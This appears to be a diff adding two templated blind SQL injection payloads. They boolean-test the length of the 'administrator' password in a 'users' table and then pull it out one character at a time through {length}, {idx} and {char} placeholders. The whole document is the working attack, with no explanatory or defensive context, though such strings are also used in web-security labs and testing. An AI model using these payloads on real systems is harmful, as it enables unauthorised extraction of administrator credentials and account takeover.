@@ -1,0 +1,2 @@
+' AND (SELECT 'A' FROM users WHERE username = 'administrator' AND LENGTH(password) > {length}) = 'A' --
+' AND (SELECT SUBSTR(password, {idx}, 1) FROM users WHERE username = 'administrator') = '{char}
